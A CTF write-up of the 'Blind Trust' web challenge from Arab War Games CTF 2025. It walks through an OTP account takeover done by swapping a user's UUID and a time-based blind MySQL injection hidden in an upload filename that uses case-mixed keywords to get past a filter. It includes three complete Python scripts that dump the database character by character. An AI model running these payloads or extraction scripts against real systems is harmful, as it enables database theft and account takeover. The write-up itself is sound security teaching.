---
title: Blind Trust
date: 2025-08-04 00:00:00 +0000
categories:
  - CTF
tags:
  - Web
  - ASC25
media_subpath: /assets/images/blindtrust
---

# Blind Trust

Hello everyone,
It’s been a while since I published a write-up. In this one, I’m going to show you how I managed to solve a web challenge that had zero solves during Arab War Games CTF 2025. Unfortunately, I didn't solve it during the competition, but I was the only one who was very close `said by the author`.

---

## First Part

### Creating an account

Let's start by examining the application and fireup our burp in the background.
First of all, as we can see, the main page only contains simple Login Register and reset password options.

![](login.png)

Let's sign up for an account and see what we can find.
Remember, the name of the challenge begins with "Blind", which might be a hint — possibly pointing toward a Blind SQLi, SSTI, RCE, or something along those lines.

When signing up, we're only asked for an email and password — no username is required.
I tried registering with dummy credentials like test@corp.com and a simple password like 123, but the application responded with a validation error. It told me that the password must contain uppercase letters and must be at least 8 characters long.

![](signup.png)

And of course, there's a CAPTCHA in place — pretty annoying, but it’s clearly there to prevent brute-force attacks on the login.

after creating my account and tried to login it asked me for an otp
![](otp.png)

I tried several ways to bypass it — like submitting an empty OTP, null, or 0000 — but none of them worked.
I thought, "Hmm, that's interesting..." The server is properly validating both the password and the CAPTCHA, which feels pretty realistic.
So I figured — why not try providing a valid email address this time?

and that is exactly what i did and i received an otp in mail

![](otp2.png)

### Finding Friends

After signing in, we land on a homepage that contains a simple search feature for finding friends.
The first thing that came to my mind was to try searching for keywords like admin, flag, and so on — just to see if anything interesting would show up.
![](admin.png)

I also searched for flag, but got nothing in return.
Then I added the admin, hoping to find something useful — but unfortunately, that didn’t yield any interesting results either.

After inspecting the page, I noticed that each user returned from the search had a UUID associated with them.
![](uuid.png)

That immediately got me thinking: why not try to take over another user's account?
That's exactly what I set out to do.

The question was — how could I achieve that?
Would it be through password reset via email confusion? Or maybe by sending two OTP requests simultaneously (Race Condition), hoping the server might generate identical OTPs for both accounts? I brainstormed a lot of possible attack vectors.

Eventually, I realized it was much simpler than that — it was all about the login process itself.
When entering the OTP during login, all I needed to do was replace my UUID with the admin's UUID (which I had found earlier by inspecting the page).

So, let’s do that and see what happens.
![](adminlogin.png)

And we're in!

### Upload Functionality

We landed on a homepage that includes an upload functionality.
![](upload.png)
we know that application is runing a php so why not trying to upload a php web shell?
![](png.png)

We discovered that only `.png` files are allowed for upload. So, I go back to **Burp Suite** to explore ways to bypass this restriction using different techniques.

Some of the ideas I tried included:

- Changing the file name to end with `%00.png` (null byte injection),
- Modifying the `Content-Type` header,
- Spoofing the MIME type or magic bytes in the uploaded file.

It turned out the server was performing two checks:

1. **The file name must end with `.png`**, and
2. **The file’s MIME type must match the magic bytes of a valid PNG image** .

So far, so good — but wait, how are we even supposed to find our uploaded files?
That question had me stuck with this approach for a while.

There was an /uploads endpoint, but it was restricted — every time I tried accessing it directly, it returned a 403 Forbidden error.
![](403.png)
I also asked the author what the upload feature was supposed to lead us to, and he told me that the file names are randomized, so there’s no way to find the uploaded files — and that there was nothing more to see.
Or at least, that’s what I thought.
I ended up leaving the challenge at that point. All of this happened during the first hour of the competition, and I had to shift my focus to other challenges that were already solved — I didn’t want to let my team down.

The next day, after solving a few other web and mobile challenges, I told myself, "Why not go back to that challenge? Maybe there’s a clue I missed."
But before diving back in, I asked the author to release a hint, since no one had solved the challenge yet — and he did.
He mentioned something about “blind”, but didn’t clarify what exactly he meant.

That immediately got me thinking of two possibilities: **Blind RCE** or **Blind SQLi**.
But wait — all we have is a **file upload** feature. So think with me for a second and ask yourself:

> _Where could you possibly find SQL injection in a file upload?_

Yup — it’s the **filename**.

If you guessed that… you're a hero :"D

Unfortunately, by that point, the competition was very close to ending.
Even the author gave me one final hint — the database was **MySQL** and it's time based. but couldn't solve it at the time

---

## Second Part

## 📝 A Quick Note

Before continuing with how I solved the challenge, I want to share a quick opinion:

> **This challenge should have included a source code review.**

Having access to the code would have been extremely helpful in understanding what we were dealing with — especially considering how limited the time was.

Unfortunately, without access to the source and with the clock ticking, it made the challenge very guessy as it contains filtred keywaords.

### Finding an oracle and bypassing filter

i tried to use querys like

```
------geckoformboundarybdbbbcfdab28124d8e8805dfdeec32ac
Content-Disposition: form-data; name="file"; filename="Select Sleep(1)--.png"
Content-Type: application/octet-stream
```

But the server returned an **empty response**, which indicated that something was wrong — maybe a filter is begin used? 🤷‍♂️
![](burp1.png)

So I started playing around with the queries a little bit, and it turned out that if a request contained a **filtered keyword**, the server would simply respond with **nothing at all** and if the query is invalid it will return **uploaded** with no body .

```
------geckoformboundarybdbbbcfdab28124d8e8805dfdeec32ac
Content-Disposition: form-data; name="file"; filename="SeLect BENCHMArK(10000000,md5(1))-- -.png"
Content-Type: application/octet-stream
```

![](burp2.png)
this one returned a longer response time which indicated that the query was valid.

### the oracle

now it's time to enumerate the data base tables and columns but first let's get the current database that we are in after playing around with the payload to work i finally manged to get it right.

```
------geckoformboundarybdbbbcfdab28124d8e8805dfdeec32ac
Content-Disposition: form-data; name="file"; filename="Select CaSE WHEN MID(DATABASE(),1,1)='b' THEN BENCHMArK(10000000,MD5(1)) ELSE 0 END-- -.png
```

![](burp3.png)

now let's automate this process to get the fullname of the database, with the help my friends chat and grok they helped me to build a multithreading script to automate this

```py

import aiohttp
import asyncio
import urllib3
import sys
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://blind-trust.ascwg-challs.app/challenge.php?page=profile"
COOKIE = {
    "PHPSESSID": "cookie"
}
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

BOUNDARY = "----geckoformboundarybf8c245aafa74d7059582a26d17cb513"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
    "Origin": "https://blind-trust.ascwg-challs.app",
    "Referer": "https://blind-trust.ascwg-challs.app/challenge.php?page=profile",
    "Te": "trailers"
}

charset = "abcdefghijklmnopqrstuvwxyz0123456789_"
png_data = bytes.fromhex(
    "89504E470D0A1A0A0000000D49484452000000D800000143080600000058F6C0D9"
    "000000017352474200AECE1CE90000000467414D410000B18F0BFC6105"
)

DELAY_THRESHOLD = 3
MAX_LEN = 20

async def check_character(session, pos, char):
    payload = (
        f"Select CaSE WHEN MID(DATABASE(),{pos},1)='{char}' THEN  BENCHMArK(10000000,MD5(1)) "
        f"ELSE 0  END-- .png"
    )

    body = (
        f"--{BOUNDARY}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{payload}\"\r\n"
        f"Content-Type: image/png\r\n\r\n"
    ).encode() + png_data + b"\r\n" + (
        f"--{BOUNDARY}\r\n"
        f"Content-Disposition: form-data; name=\"upload\"\r\n\r\n"
        f"Upload\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode()

    start = time.time()
    try:
        async with session.post(
            URL,
            headers=HEADERS,
            cookies=COOKIE,
            data=body,
            proxy=PROXIES["http"],
            ssl=False,
            timeout=15
        ):
            elapsed = time.time() - start
            return char, elapsed > DELAY_THRESHOLD
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return char, False

async def extract_position(session, pos):
    tasks = [check_character(session, pos, c) for c in charset]
    results = await asyncio.gather(*tasks, return_exceptions=True)
    for char, success in results:
        if success:
            return char
    return None

async def main():
    print("[*] Extracting database name...")
    db_name = ""

    async with aiohttp.ClientSession() as session:
        for pos in range(1, MAX_LEN + 1):
            char = await extract_position(session, pos)
            if char:
                db_name += char
                sys.stdout.write(char)
                sys.stdout.flush()
            else:
                break

    print(f"\n[+] Done: Database name is '{db_name}'")

if __name__ == "__main__":
    asyncio.run(main())

    ##web_challengetest
```

and we extracted the db name which is `web_challengetest` now let us see how many tables are there in this db, for that i used this payload

```
Content-Disposition: form-data; name="file"; filename="Select CaSE WHEN (Select COuNT(*) FrOM information_schema.tables WHeRe table_schema='web_challengetest')>0 THEN BENCHMArK(10000000,MD5(1)) ELSE 0 END-- .png"
```

and we got that the db conatins 3 tables, now let's get thier names i used this payload and i will provied the full solver code at the end of the writeup

```py
    payload = (
        f"Select CaSE WHEN MID((Select table_name FROM information_schema.tables WHERE table_schema='{DATABASE}' "
        f"LIMIT 1 OFFSET {table_idx}),{pos},1)='{char}' THEN BENCHMArK(10000000,MD5(1)) ELSE 0 END-- .png"
    )
```

we extract three table name which was `flag` and `friends` i didn't care about the thired table name acutly once i found the flag table xD.
now it's time to get the coulmns name inside the flag table
i used this payload to get that

```py
payload = (
        f"Select CaSE WHEN MID((SelecT column_name FROM information_schema.columns WHERE table_schema='{DATABASE}' "
        f"AND table_name='{TABLE}' LIMIT 1 OFFSET {column_idx}),{pos},1)='{char}' THEN BENCHMArK(10000000,MD5(1)) ELSE 0 END-- .png"
    )
```

we extracted 2 coulmns `id` and `value` so let's get the flag from value coulmn that's inside the flag table this was the code that made me get the flag

```py
import aiohttp
import asyncio
import urllib3
import sys
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")
logger = logging.getLogger(__name__)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

URL = "https://blind-trust.ascwg-challs.app/challenge.php?page=profile"
COOKIE = {
    "PHPSESSID": "session_cookie"
}
PROXIES = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

BOUNDARY = "----geckoformboundarybf8c245aafa74d7059582a26d17cb513"
HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:141.0) Gecko/20100101 Firefox/141.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Content-Type": f"multipart/form-data; boundary={BOUNDARY}",
    "Origin": "https://blind-trust.ascwg-challs.app",
    "Referer": "https://blind-trust.ascwg-challs.app/challenge.php?page=profile",
}

charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_{}!@#$%^&*()-=+,.:;"  # Expanded for uppercase
png_data = bytes.fromhex(
    "89504E470D0A1A0A0000000D49484452000000D800000143080600000058F6C0D9"
    "000000017352474200AECE1CE90000000467414D410000B18F0BFC6105"
)

DELAY_THRESHOLD = 2
MAX_LEN = 50
TABLE = "flag"
COLUMN = "value"
CONCURRENT_LIMIT = 5
RETRY_ATTEMPTS = 3
BENCHMARK_ITERATIONS = 10000000
TIMEOUT = 20

async def check_payload(session, payload, semaphore):
    body = (
        f"--{BOUNDARY}\r\n"
        f"Content-Disposition: form-data; name=\"file\"; filename=\"{payload}\"\r\n"
        f"Content-Type: image/png\r\n\r\n"
    ).encode() + png_data + b"\r\n" + (
        f"--{BOUNDARY}\r\n"
        f"Content-Disposition: form-data; name=\"upload\"\r\n\r\n"
        f"Upload\r\n"
        f"--{BOUNDARY}--\r\n"
    ).encode()

    for attempt in range(RETRY_ATTEMPTS + 1):
        async with semaphore:
            start = time.time()
            try:
                async with session.post(
                    URL,
                    headers=HEADERS,
                    cookies=COOKIE,
                    data=body,
                    proxy=PROXIES["http"],
                    ssl=False,
                    timeout=TIMEOUT
                ):
                    elapsed = time.time() - start
                    logger.debug(f"Payload '{payload[:50]}...': {elapsed:.2f}s")
                    return elapsed
            except (aiohttp.ClientError, asyncio.TimeoutError) as e:
                if attempt < RETRY_ATTEMPTS:
                    logger.warning(f"Retry {attempt + 1}/{RETRY_ATTEMPTS} for payload '{payload[:50]}...': {e}")
                    await asyncio.sleep(0.5)
                    continue
                logger.error(f"Failed for payload '{payload[:50]}...': {e}")
                return 0

async def check_character(session, pos, char, semaphore):
    payload = (
        f"sELECT CAsE WHEN MID((sELECT {COLUMN} FROM {TABLE} LIMIT 0,1),{pos},1)='{char}' "
        f"THEN BENCHMArK({BENCHMARK_ITERATIONS},MD5(1)) ELSE 0 END-- .png"
    )
    elapsed = await check_payload(session, payload, semaphore)
    return char, elapsed > DELAY_THRESHOLD

async def extract_flag(session, semaphore):
    flag_value = ""
    for pos in range(1, MAX_LEN + 1):
        logger.info(f"Checking position {pos} for flag value")
        tasks = [check_character(session, pos, c, semaphore) for c in charset]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        found = False
        for result in results:
            if isinstance(result, Exception):
                logger.error(f"Exception at pos {pos}: {result}")
                continue
            char, success = result
            if success:
                flag_value += char
                sys.stdout.write(char)
                sys.stdout.flush()
                print(f"\n[+] Current flag: '{flag_value}'")
                found = True
                break
        if not found:
            break
    return flag_value if flag_value else None

async def main():
    print(f"[*] Extracting value from column '{COLUMN}' in table '{TABLE}'...")
    semaphore = asyncio.Semaphore(CONCURRENT_LIMIT)

    async with aiohttp.ClientSession() as session:
        flag_value = await extract_flag(session, semaphore)
        if flag_value:
            print(f"\n[+] Found flag: '{flag_value}'")
        else:
            print("\n[!] No value extracted. Check logs for response times or test manually in Burp Suite:")
            print(f"sELECT CAsE WHEN MID((sELECT {COLUMN} FROM {TABLE} LIMIT 0,1),1,1)='f' "
                  f"THEN BENCHMArK({BENCHMARK_ITERATIONS},MD5(1)) ELSE 0 END-- .png")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        logger.error(f"Main loop failed: {e}")
        print(f"\n[!] Error: Failed to extract value due to {e}. Check logs for details.")

```

and finaly we got our flag

![](flag.png)

and this is the full solver script from the author himself

```py
import requests
import time
import string
import random
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from datetime import datetime, timedelta

# Configuration
url = "https://blind-trust.ascwg-challs.app/challenge.php?page=profile"
cookie = "PHPSESSID=476aca5043e9509d1dd933a314ea685d"  # Change this!
proxy = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

headers = {
    "Host": "blind-trust.ascwg-challs.app",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate, br",
    "Origin": "https://blind-trust.ascwg-challs.app",
    "Connection": "keep-alive",
    "Referer": "https://blind-trust.ascwg-challs.app/challenge.php?page=profile",
    "Cookie": cookie,
    "Upgrade-Insecure-Requests": "1",
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-User": "?1",
    "Priority": "u=0, i"
}

PNG_DATA = bytes.fromhex("89504E470D0A1A0A0000000D4948445200000001000000010802000000907753DE0000000B49444154180905C10100000000FFFFE20B2E0100000001735247420000AECE0000000049454E44AE426082")

DB_CHARS = string.ascii_lowercase + string.digits + "_"
TABLE_COLUMN_CHARS = string.ascii_lowercase + string.digits + "_"
DATA_CHARS = set(string.printable) - {'\n', '\r', '\t', '\x0b', '\x0c'}

def generate_db_payload(position, char):
    return f"Select CaSE WHEN MID(DATABASE(),{position},1)='{char}' THEN  BENCHMArK(10000000,MD5(1)) ELSE 0  END-- "

def generate_table_payload(position, char, table_offset,  database_name):
    return (
       f"SelECT CaSE WHEN MID((SeLECT table_name FROM information_schema.tables WHERE table_schema='{database_name}' LIMIT {table_offset},1),{position},1)='{char}' THEN BeNCHMARK(10000000,MD5(1)) ELSE 0 END-- "
    )

def generate_column_payload(position, char, table_name, column_offset,  database_name):
    return (
        f"SeLECT CASe WHEN MID((SeLECT column_name FROM information_schema.columns WHERE table_schema='{database_name}' AND table_name='{table_name}' LIMIT {column_offset},1),{position},1)='{char}' THEN BeNCHMARK(10000000,MD5(1)) ELSE 0 END-- "
    )

def generate_data_payload(position, char, table_name, column_name, row_offset, database_name):
    safe_char = char.replace("'", "''").replace("\\", "\\\\")
    return (
        f"sELECT CAsE WHEN MID((sELECT `{column_name}` FROM `{database_name}`.`{table_name}` "
        f"LIMIT {row_offset},1),{position},1)='{safe_char}' "
        f"THEN BENCHMArK(10000000,MD5(1)) ELSE 0 END-- "
    )

def test_char(position, char, payload_generator, *args):
    delay_count = 0
    max_attempts = 4

    for attempt in range(1, max_attempts + 1):
        payload = payload_generator(position, char, *args)
        boundary = '----' + ''.join(random.choices(string.hexdigits, k=32))
        body = (
            f"--{boundary}\r\n"
            f'Content-Disposition: form-data; name="file"; filename="{payload}.png"\r\n'
            "Content-Type: image/png\r\n\r\n"
        ).encode() + PNG_DATA + (
            f"\r\n--{boundary}\r\n"
            f'Content-Disposition: form-data; name="upload"\r\n\r\n'
            f"Upload\r\n"
            f"--{boundary}--\r\n"
        ).encode()

        headers["Content-Type"] = f"multipart/form-data; boundary={boundary}"
        headers["Content-Length"] = str(len(body))

        try:
            start_time = time.time()
            requests.post(url, data=body, headers=headers, timeout=15, proxies=proxy, verify=False)
            elapsed = time.time() - start_time

            if elapsed > 3:
                delay_count += 1
                if delay_count >= 2:
                    return True

        except requests.exceptions.Timeout:
            delay_count += 1
            if delay_count >= 2:
                return True

    return False

def extract_value(name, payload_generator, chars, *args):
    value = ""
    position = 1
    extraction_start = time.time()
    consecutive_skips = 0
    max_consecutive_skips = 2

    print(f"[+] Extracting: {name}")

    while True:
        found_char = None

        for char in sorted(chars, key=lambda c: ord(c)):
            if test_char(position, char, payload_generator, *args):
                value += char
                print(f"  [*] Found: {char} → Current: '{value}'")
                found_char = char
                consecutive_skips = 0
                break

        if not found_char:
            consecutive_skips += 1
            if consecutive_skips >= max_consecutive_skips:
                print(f"  [!] Skipped {max_consecutive_skips} positions, ending extraction")
                break

        position += 1
        if position > 100:
            print(f"  [!] Reached max length limit (100)")
            break

        if position > 10 and not value:
            print(f"  [!] No valid characters found in first 10 positions")
            break

    if value:
        elapsed = time.time() - extraction_start
        print(f"  [+] Final value: '{value}' (in {timedelta(seconds=elapsed)})")
        return value
    else:
        print("  [!] No value found")
        return None

def extract_database_name():
    print("\n[+] PHASE 1: Extracting database name")
    return extract_value("database name", generate_db_payload, DB_CHARS)

def extract_tables(database_name):
    tables = []
    table_offset = 0

    print("\n[+] PHASE 2: Extracting tables")
    while True:
        table_name = extract_value(
            f"table at OFFSET {table_offset}",
            generate_table_payload,
            TABLE_COLUMN_CHARS,
            table_offset,
            database_name
        )
        if not table_name:
            if table_offset == 0:
                print("[!] No tables found")
            else:
                print(f"[+] Found {len(tables)} tables")
            break

        tables.append(table_name)
        table_offset += 1
    return tables

def extract_columns(table_name, database_name):
    columns = []
    column_offset = 0

    print(f"\n[+] Extracting columns from table: {table_name}")
    while True:
        column = extract_value(
            f"column at OFFSET {column_offset}",
            generate_column_payload,
            TABLE_COLUMN_CHARS,
            table_name,
            column_offset,
            database_name
        )
        if not column:
            if column_offset == 0:
                print(f"[!] No columns found in {table_name}")
            else:
                print(f"[+] Found {len(columns)} columns")
            break

        columns.append(column)
        column_offset += 1
    return columns

def extract_table_data(table_name, columns, database_name):
    data = []
    row_offset = 0
    max_rows = 20
    table_start = time.time()

    print(f"\n{'='*60}")
    print(f"[+] STARTING DATA EXTRACTION: Table '{table_name}'")
    print(f"{'='*60}")

    while row_offset < max_rows:
        row_data = {}
        row_found = False
        row_start = time.time()

        print(f"\n[+] Extracting row {row_offset}:")
        for column in columns:
            value = extract_value(
                f"{table_name}.{column} row {row_offset}",
                generate_data_payload,
                DATA_CHARS,
                table_name,
                column,
                row_offset,
                database_name
            )
            if value:
                row_found = True
                row_data[column] = value
            else:
                row_data[column] = None

        if not row_found:
            print(f"\n[!] No more data in table '{table_name}'")
            break

        data.append(row_data)
        row_time = time.time() - row_start
        print(f"\n[+] Completed row {row_offset} in {timedelta(seconds=row_time)}:")
        for col, val in row_data.items():
            print(f"  - {col}: {val}")
        row_offset += 1

    table_time = time.time() - table_start
    print(f"\n{'='*60}")
    print(f"[+] FINISHED TABLE: '{table_name}' - {len(data)} rows in {timedelta(seconds=table_time)}")
    print(f"{'='*60}")
    return data

def discover_database_structure():
    print("\n[+] No predefined structure - starting full discovery")
    structure = {'name': '', 'tables': {}}

    db_name = extract_database_name()
    if not db_name:
        print("[!] Failed to extract database name")
        return None
    structure['name'] = db_name

    tables = extract_tables(db_name)
    if not tables:
        print("[!] No tables found")
        return structure

    for table in tables:
        columns = extract_columns(table, db_name)
        structure['tables'][table] = columns

    return structure

def main():
    global database_name
    global_start = time.time()

    print(f"\n{'#'*60}")
    print(f"[+] STARTING EXTRACTION AT: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"[+] Using proxy: {proxy['http']}")
    print(f"[+] 2-delay confirmation | 4 max attempts | 3s threshold\n")
    print(f"{'#'*60}")

    database = discover_database_structure()
    if not database:
        print("[!] Failed to discover database structure")
        return

    database_name = database['name']
    print("\n[+] Database structure loaded:")
    print(f"Database: {database['name']}")
    for table, columns in database['tables'].items():
        print(f"  - Table: {table}")
        print(f"    Columns: {', '.join(columns)}")

    print("\n[+] Starting data extraction...")
    for table_name, columns in database['tables'].items():
        data = extract_table_data(table_name, columns, database['name'])
        database['tables'][table_name] = {
            'columns': columns,
            'data': data
        }

    print(f"\n{'#'*60}")
    print("[+] FINAL DATABASE DUMP")
    print(f"{'#'*60}")
    print(f"Database: {database['name']}")

    for table_name, table_info in database['tables'].items():
        print(f"\nTable: {table_name}")
        print(f"Columns: {', '.join(table_info['columns'])}")

        if not table_info['data']:
            print("  No data found")
            continue

        print("\nData:")
        for i, row in enumerate(table_info['data']):
            print(f"\nRow {i}:")
            for col, val in row.items():
                print(f"  {col}: {val}")

    total_time = time.time() - global_start
    print(f"\n{'#'*60}")
    print(f"[+] EXTRACTION COMPLETED IN: {timedelta(seconds=total_time)}")
    print(f"[+] Finished at: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"{'#'*60}")

if __name__ == "__main__":
    main()
```

### Final Note

At the very least, I want to thank the author of this challenge — it was a **great challenge**, truly.  
I had a lot of fun working on it, and more importantly, I **learned a lot** along the way.
see ya later <33
